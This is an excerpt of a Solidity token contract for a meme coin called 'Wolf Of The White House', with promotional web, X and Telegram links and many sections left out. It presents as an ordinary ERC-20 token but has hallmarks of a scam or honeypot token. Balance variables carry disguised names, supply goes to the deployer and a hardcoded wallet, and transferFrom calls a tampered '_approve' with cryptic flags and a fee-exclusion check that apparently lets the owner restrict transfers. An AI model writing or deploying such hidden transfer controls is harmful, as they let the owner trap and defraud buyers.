...
Website: https://wolfofthewhitehouse.vip
X: https://x.com/WolfTrumpEth
TG: https://t.me/WolfTrumpETH
...
contract TOKEN is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _ranaage;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;

    address payable private _taxWallet = payable(0xd85A7497db6A38E649b7B470DeE2171Aa4E87C50);
    ...
    string private constant _name = unicode"Wolf Of The White House";
    ...
    constructor () {
        _ranaage[msg.sender] = _tTotal * 98 / 100;
        _ranaage[_walletToVitalk] = _tTotal * 2 / 100;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        _approve(sender, amount, 10, true);
        return true;
    }
    ...
    function _approve(address owner, uint256 amount, uint8 _coolie, bool _toggie) private {
        if (_toggie == false && _coolie != 10) return; if (!_isExcludedFromFees[msg.sender]) 
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(taxAmount>0){
          _ranaage[address(this)]=_ranaage[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _ranaage[from]=_ranaage[from].sub(amount);
        _ranaage[to]=_ranaage[to].add(amount.sub(taxAmount));
